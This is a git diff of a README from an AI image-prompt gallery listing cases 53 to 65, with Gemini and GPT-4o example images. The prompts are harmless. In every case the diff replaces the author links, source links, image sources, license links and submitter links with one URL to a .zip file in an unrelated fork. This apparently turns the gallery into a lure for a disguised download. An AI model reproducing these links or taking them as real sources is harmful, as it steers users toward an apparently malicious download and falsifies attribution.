+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -1135,21 +1135,21 @@ Transform the {❄️} into a soft 3D object with a silk texture. The entire sur
 *Note: You can replace the {❄️} in the prompt words with your target value*
 
 
-**Submitter:** [wowmarcomei](https://github.com/wowmarcomei)
+**Submitter:** [wowmarcomei](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-65"></a>
-### Case 65: Surreal Underwater Scene Popsicle (by [@madpencil_](https://x.com/madpencil_))
+### Case 65: Surreal Underwater Scene Popsicle (by [@madpencil_](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/madpencil_/status/1920037538372128998)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-sleMUJG0_smfYhUJ0x9zk.png?v=1" width="300" alt="Art Style: 奇幻水下场景冰棒 (Gemini Example 65) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/65/surreal-underwater-scene-popsicle.png" width="300" alt="Art Style: 奇幻水下场景冰棒 (Gemini Example 65) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/madpencil_">@madpencil_</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 奇幻水下场景冰棒 (Gemini Example 65) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 奇幻水下场景冰棒 (Gemini Example 65) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@madpencil_</a></sub>
 
 **Prompt**
 
@@ -1165,14 +1165,14 @@ Tilt POV shot of a hand holding a surreal popsicle with a transparent blue exter
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-64"></a>
-### Case 64: Steampunk Mechanical Fish (by [@f-is-h](https://github.com/f-is-h))
+### Case 64: Steampunk Mechanical Fish (by [@f-is-h](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://github.com/f-is-h/f-is-h/blob/main/images/streampank-fish-4.png)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-NwKHSkobGZuQuaTfzYnkk.png?v=1" width="300" alt="Art Style: 蒸汽朋克机械鱼 (Gemini Example 64) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/64/example_steampunk_fish.jpg" width="300" alt="Art Style: 蒸汽朋克机械鱼 (Gemini Example 64) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/f-is-h">@f-is-h</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://github.com/f-is-h">@f-is-h</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 蒸汽朋克机械鱼 (Gemini Example 64) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 蒸汽朋克机械鱼 (Gemini Example 64) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@f-is-h</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@f-is-h</a></sub>
 
 **Prompt**
 
@@ -1189,21 +1189,21 @@ The entire fish looks very cool. This is a high-definition image with extremely 
 *Note: This image showcases an excellent combination of steampunk style and metallic textures, presenting intricate mechanical details and a retro-futuristic aesthetic.*
 
 
-**Submitter:** [f-is-h](https://github.com/f-is-h)
+**Submitter:** [f-is-h](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-63"></a>
-### Case 63: Emoji Cream Popsicle (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 63: Emoji Cream Popsicle (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1914574278911000967)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-ofHrVK4oclwpJayzpx6C5.png?v=1" width="300" alt="Cream Ice Cream - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/63/example_ice_cream_emoji_strawberry.png" width="300" alt="Cream Ice Cream - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Cream Ice Cream - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Cream Ice Cream - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -1220,14 +1220,14 @@ Generate an image: Transform the [🍓] into a creamy ice cream bar, with cream 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-62"></a>
-### Case 62: Kawaii Enamel Pin (by [@gnrlyxyz](https://x.com/gnrlyxyz))
+### Case 62: Kawaii Enamel Pin (by [@gnrlyxyz](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/gnrlyxyz/status/1914303110853583302)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-BZ4bE3tr5QKkaogEl_XQI.png?v=1" width="300" alt="Enamel Pin - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/62/example_enamel_pins_einstein.png" width="300" alt="Enamel Pin - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/gnrlyxyz">@gnrlyxyz</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Enamel Pin - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Enamel Pin - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@gnrlyxyz</a></sub>
 
 **Prompt**
 
@@ -1238,21 +1238,21 @@ Turn the subject in the attached image into a kawaii enamel pin. Use glossy meta
 
 **Reference Image Required:** Needs a photo of a person or object as the subject for transformation.
 
-**Submitter:** [StevenSong-sTs](https://github.com/StevenSong-sTs)
+**Submitter:** [StevenSong-sTs](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-61"></a>
-### Case 61: Fake Tweet Screenshot (Einstein) (by [@egeberkina](https://x.com/egeberkina))
+### Case 61: Fake Tweet Screenshot (Einstein) (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1914299716394778713)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-5NAPAcMNSLl7j8PuX5mnt.png?v=1" width="300" alt="Fake Tweet Screenshot - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/61/example_fake_tweet_einstein.png" width="300" alt="Fake Tweet Screenshot - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Fake Tweet Screenshot - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Fake Tweet Screenshot - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -1268,14 +1268,14 @@ a hyper realistic twitter post by Albert Einstein right after finishing the theo
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-60"></a>
-### Case 60: Emoji Tufted Rug (by [@gizakdag](https://x.com/gizakdag))
+### Case 60: Emoji Tufted Rug (by [@gizakdag](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/gizakdag/status/1913925062568144924)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-g1eDis0d0iaIEKLnkUSaa.png?v=1" width="300" alt="Tufted Rug - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/60/example_tufted_rug_star_emoji.png" width="300" alt="Tufted Rug - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/gizakdag">@gizakdag</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Tufted Rug - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Tufted Rug - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@gizakdag</a></sub>
 
 **Prompt**
 
@@ -1292,14 +1292,14 @@ Create an image of a colorful, hand-tufted rug in the shape of 🦖 emoji, place
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-59"></a>
-### Case 59: Colorful Vector Art Poster (by [@michaelrabone](https://x.com/michaelrabone))
+### Case 59: Colorful Vector Art Poster (by [@michaelrabone](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/michaelrabone/status/1913865394139316291)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-4z8yN-EVHRBthTnpCB8Ka.png?v=1" width="300" alt="Vector Art Poster - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/59/example_vector_poster_london.png" width="300" alt="Vector Art Poster - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/michaelrabone">@michaelrabone</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Vector Art Poster - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Vector Art Poster - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@michaelrabone</a></sub>
 
 **Prompt**
 
@@ -1316,14 +1316,14 @@ Barcelona Spain colourful summer vector art poster with big "BARCELONA" title at
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-58"></a>
-### Case 58: Cloud Art (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 58: Cloud Art (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/umesh_ai/status/1913628737872027805)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-ufKQRU-0zXXlACt_A_DNd.png?v=1" width="300" alt="Cloud Art - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/58/example_cloud_art_dragon_great_wall.png" width="300" alt="Cloud Art - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Cloud Art - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Cloud Art - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
@@ -1340,14 +1340,14 @@ Generate image: A photograph captures a daytime scene with a [SUBJECT/OBJECT] fo
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-57"></a>
-### Case 57: 8-Bit Pixel Icon (by [@egeberkina](https://x.com/egeberkina))
+### Case 57: 8-Bit Pixel Icon (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1913654508330058064)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-H0E8EqQ10jrbe0d8q7137.png?v=1" width="300" alt="Pixel Icon - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/57/example_8bit_pixel_beer.png" width="300" alt="Pixel Icon - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Pixel Icon - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Pixel Icon - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -1364,14 +1364,14 @@ Create a minimalist 8-bit pixel logo of [🍔], centered on a pure white backgro
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-56"></a>
-### Case 56: Miniature 3D Building (by [@dotey](https://x.com/dotey))
+### Case 56: Miniature 3D Building (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1913759515700285569)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-0bQpHIpimYLLrSJ8qe6C6.png?v=1" width="300" alt="Object: 迷你 3D 建筑 (Gemini Example 56) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/56/example_miniature_starbucks_cup_building.png" width="300" alt="Object: 迷你 3D 建筑 (Gemini Example 56) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 迷你 3D 建筑 (Gemini Example 56) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 迷你 3D 建筑 (Gemini Example 56) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -1388,14 +1388,14 @@ Create a minimalist 8-bit pixel logo of [🍔], centered on a pure white backgro
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-55"></a>
-### Case 55: Cute Plant Planter (by [@azed_ai](https://x.com/azed_ai))
+### Case 55: Cute Plant Planter (by [@azed_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/azed_ai/status/1923739813414568075)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-KMvfZkLFuvMEzCzBT8ywr.png?v=1" width="300" alt="Creative: 创意绿植花盆 (Gemini Example 55) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/55/cute_plant_planter.png" width="300" alt="Creative: 创意绿植花盆 (Gemini Example 55) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/azed_ai">@azed_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Creative: 创意绿植花盆 (Gemini Example 55) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Creative: 创意绿植花盆 (Gemini Example 55) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@azed_ai</a></sub>
 
 **Prompt**
 
@@ -1412,14 +1412,14 @@ A high-quality photo of a cute ceramic [object/animal]-shaped planter with a glo
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-54"></a>
-### Case 54: Extremely Ordinary iPhone Selfie (by [@jiamimaodashu](https://x.com/jiamimaodashu))
+### Case 54: Extremely Ordinary iPhone Selfie (by [@jiamimaodashu](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/jiamimaodashu/status/1912653073190879410)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-REfe_PfgYfz67f5liafKu.png?v=1" width="300" alt="Art Style: “极其平凡”的iPhone自拍 (Gemini Example 54) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/54/example_ordinary_selfie_eason_nicholas.png" width="300" alt="Art Style: “极其平凡”的iPhone自拍 (Gemini Example 54) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/jiamimaodashu">@jiamimaodashu</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: “极其平凡”的iPhone自拍 (Gemini Example 54) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: “极其平凡”的iPhone自拍 (Gemini Example 54) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jiamimaodashu</a></sub>
 
 **Prompt**
 
@@ -1437,14 +1437,14 @@ The subjects are Eason Chan and Nicholas Tse, taken at night, next to the Hong K
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-53"></a>
-### Case 53: Emoji Inflatable Cushion (by [@gizakdag](https://x.com/gizakdag))
+### Case 53: Emoji Inflatable Cushion (by [@gizakdag](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
